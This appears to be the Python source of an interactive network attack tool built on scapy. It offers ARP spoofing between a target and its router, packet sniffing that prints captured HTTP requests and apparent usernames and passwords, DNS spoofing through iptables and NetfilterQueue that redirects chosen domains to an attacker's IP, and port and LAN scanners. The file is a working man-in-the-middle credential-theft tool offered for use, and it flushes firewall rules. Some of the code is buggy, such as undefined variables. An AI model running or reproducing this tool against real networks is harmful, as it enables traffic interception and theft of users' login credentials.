import scapy.all as sc
from time import sleep
from subprocess import call
import socket
from sys import exit
from scapy.layers import http
from tkinter import *
from colorama import init, Fore, Style
from netfilterqueue import NetfilterQueue           
from threading import Thread, Lock
from queue import Queue        
from sys import exit

class arp_spoof:
    def __init__(self, cikl, time, Tar_IP, Route_IP, choice):
        self.number_of_sent=0
        self.stopped=False
        self.Route_IP=Route_IP
        self.Target_IP=Target_IP
        self.Tar_Mac=self.get_Mac_by_IP(Tar_IP)
        self.Route_Mac=self.get_Mac_by_IP(Route_IP)
        if choice == 'snif':
            Thread(target=self.snif, args=(input(f'[+]Enter interface ⟶ {Style.RESET_ALL}'), )).start()
        elif choice == 'queue':
            all_blocked = input(f'{Fore.LIGHTBLACK_EX}[+]Enter spoofing pages, using cumma ⟶ ')
            self.ip_spoof = input(f'{Fore.GREEN}[+]Enter new IP of spoofing pages ⟶ {Style.RESET_ALL}')
            if all_blocked.replace(',', '') != all_blocked:
                all_blocked=all_blocked.replace(' ', '').split(', ')
                self.alls=[]
                for i in all_blocked:
                    i=i.replace('https://', '').replace('http://', '') 
                    self.alls.append(i)
            else:
                self.alls=[all_blocked.replace('https://', '').replace('http://', '')]
            Thread(target=self.queue_run, args=()).start()
        Thread(target=self.spoof, args=(Tar_IP, self.Tar_Mac, Route_IP, cikl, time, )).start()
        Thread(target=self.spoof, args=(Route_IP, self.Route_Mac, Tar_IP, cikl, time, )).start()
        while True:
            sleep(time+0.2)
            if self.stopped == False:  
                print(f'[+]Sent {self.number_of_sent} packets.', end='\r')
            else:
                print('\rStopped', end='')            

    def get_Mac_by_IP(self, IP):
        packet=sc.Ether(dst='ff:ff:ff:ff:ff:ff')/sc.ARP(pdst=IP)
        ans=sc.srp(packet, verbose=False, timeout=1)[0]
        while True:
            try:
                return ans[0][1].hwsrc
                break
            except:
                pass

    def get_IP_by_Mac(self, Mac):
        packet=sc.Ether(dst=Mac)/sc.ARP(pdst='192.168.1.1/24')
        ans=sc.srp(packet, verbose=False, timeout=1)[0]
        while True:
            try:
                return ans[0][1].psrc
                break
            except:
                pass

    def spoof(self, pdst_Mac, hwdstt, psrcc_Mac, cikl, time):
        while True:
            if self.stopped == False:
                if self.number_of_sent % cikl == 0:
                    pdstt = self.get_IP_by_Mac(self.Tar_Mac)
                    psrcc = self.get_IP_by_Mac(self.Route_Mac)
                sc.send(sc.ARP(op=2, pdst=pdstt, hwdst=hwdstt, psrc=psrcc), verbose=False, count=4)
                sleep(time/5)
                self.number_of_sent+=1

    def stop(self):
        self.stopped=True

    def resume(self):
        self.stopped=False

    def snif(self, interface):
        sc.sniff(iface=interface, store=False, prn=self.process_sniffed_paccket)

    def get_auth_info(self, text):
        stop = False
        for verb in ['pass', 'nick', 'name', 'user']:
            if verb in text or '":"' in text:
                return True
                stop=True
        if stop == False:
            return False

    def process_sniffed_paccket(self, packet):
        if packet.haslayer(sc.Raw) and packet.haslayer(sc.IP):
            if self.Target_IP not in str(packet[IP].src):
                try:
                    url=packet.Host + packet.Path
                    print(f'[+] HTTP/HTTPS Request >> {url}', end='\n\n')
                except:
                    pass
                load_data=str(packet[sc.Raw].load).replace('\\n', '\n').replace('\\r', '\r')
                if self.get_auth_info(load_data):
                    print(f'\n\n[+] Username/password >> \n{load_data}\n\n')
                else:
                    try:
                        print(packet.Host)
                    except:
                        pass
    def queue_run(self):
        call('sudo iptables --flush', shell=True)
        call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 1', shell=True)
        call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 1', shell=True)
        qu = NetfilterQueue()
        qu.bind(1, self.process_packet)

        try:
            qu.run()
        except KeyboardInterrupt:
            call('iptables --flush', shell=True)
    def process_packet(self, packet):
        scapy_packet = sc.IP(packet.get_payload())
        if scapy_packet.haslayer(sc.DNSRR):
            qname = scapy_packet[sc.DNSQR].qname
            stq=str(qname)
            for domen in self.alls:
                if domen[1:-1] in stq:
                    print("[+] Spoofing target...")
                    answer = sc.DNSRR(rrname = qname, rdata = self.ip_spoof)
                    scapy_packet[sc.DNS].an = answer
                    scapy_packet[sc.DNS].ancount = 1
                    scapy_packet.dport=443
                    if scapy_packet.haslayer(sc.IP):
                        del scapy_packet[sc.IP].len
                        del scapy_packet[sc.IP].chksum
                        if '127.0.0.1' in scapy_packet[sc.IP].src:
                            scapy_packet[sc.IP].dst=self.Route_IP
                        else:
                            scapy_packet[sc.IP].dst=self.Route_IP
                    if scapy_packet.haslayer(sc.UDP):
                        del scapy_packet[sc.UDP].chksum
                        del scapy_packet[sc.UDP].len
                    if scapy_packet.haslayer(sc.UDP):
                        print(scapy_packet[sc.IP].show())
                    packet.set_payload(bytes(scapy_packet))
        packet.accept()
class Scan:
    def __init__(self, host, N_THREADS):
        self.host=host
        self.GREEN = Fore.GREEN
        self.RESET = Fore.RESET
        self.GRAY = Fore.LIGHTBLACK_EX
        self.N_THREADS = N_THREADS
        self.q = Queue()
        self.print_lock = Lock()
        for t in range(self.N_THREADS):
            t = Thread(target=self.scan_thread)
            t.daemon = True
            t.start()
        for worker in range(65536):
            self.q.put(worker)
        self.q.join()
        sleep(0.4)
    def port_scan(self, port):
        try:
            s = socket.socket()
            s.connect((self.host, port))

        except:
            print(f"{self.GRAY}{port:5} is closed  {self.RESET}", end='\r')
        else:
            print(f"{self.GREEN}{self.host:15}:{port:5} is open  {self.RESET}")
        s.close()

    def scan_thread(self):
        while True:
            worker = self.q.get()
            self.port_scan(worker)
            self.q.task_done()

class scanner_wifi:
    def __init__(self):
        print(f'{Fore.BLUE}   IP\t\t\tMAC')
        for i in self.scan('192.168.1.1/24'):
            print(f'{i[0]}\t  {i[1]}')
        print(Style.RESET_ALL, end='')

    def scan(self, ip):
        ipandmac=[]
        ans=sc.srp(sc.Ether(dst='ff:ff:ff:ff:ff:ff')/sc.ARP(pdst=ip), timeout=1, verbose = False)[0]
        for i in ans:
            ipandmac.append([i[1].psrc, i[1].hwsrc])
        return ipandmac

green=Fore.GREEN
red=Fore.CYAN
reset=Style.RESET_ALL
print(reset, end='')
while True:
    print(f"{red}1 ⟶ ARP Spoof\n{green}2 ⟶ ARP Spoof + Snif\n{red}3 ⟶ DNS Spoofing\n{green}4 ⟶ Ports scan\n{red}5 ⟶ Wifi Scanner{reset}\n\n6 ⟶ Clear\n7 ⟶ Exit\n")
    a=input(Fore.MAGENTA)
    if a == '1' or a == '2' or a == '3':
        cikl=int(input(f'{Fore.GREEN}[+] Enter cicle ⟶ '))
        time=int(input(f'{Fore.LIGHTBLACK_EX}[+] Enter time ⟶ '))
        call('sysctl -w net.ipv4.ip_forward='+input(f'{Fore.GREEN}[+] Forwarding 0/1 ⟶ '), shell=True)
        Route_IP=input(f'{Fore.LIGHTBLACK_EX}[+]Enter Router IP ⟶ ')
        Tar_IP=Route_IP+input(f'{Fore.GREEN}[+]Enter Target IP ⟶ {Route_IP}')
        if a == '1':
            arp_spoof(cikl, time, Tar_IP, Route_IP, 'not')
        if a == '2':
            arp_spoof(cikl, time, Tar_IP, Route_IP, 'snif')
        if a == '3':
            arp_spoof(cikl, time, Tar_IP, Route_IP, 'queue')
    elif a == '4':
        hostt=input(f'{Fore.GREEN}[+] Enter host ⟶ ')
        threads=int(input(f'{Fore.LIGHTBLACK_EX}[+] Enter number of threads ⟶ {Fore.MAGENTA}'))
        Scan(hostt, threads)
    elif a == '5':
        scanner_wifi()
    elif a =='6':
        call('clear')
    else:
        print(reset)
        exit()
    if a != '6':
        print(f'\n{green}1 ⟶ Next with clear\n2 ⟶ Next without clear{reset}')
        ch=input(Fore.MAGENTA)
        if ch == '1':
            call('clear')
        elif ch == '2':
            print('\n\n')
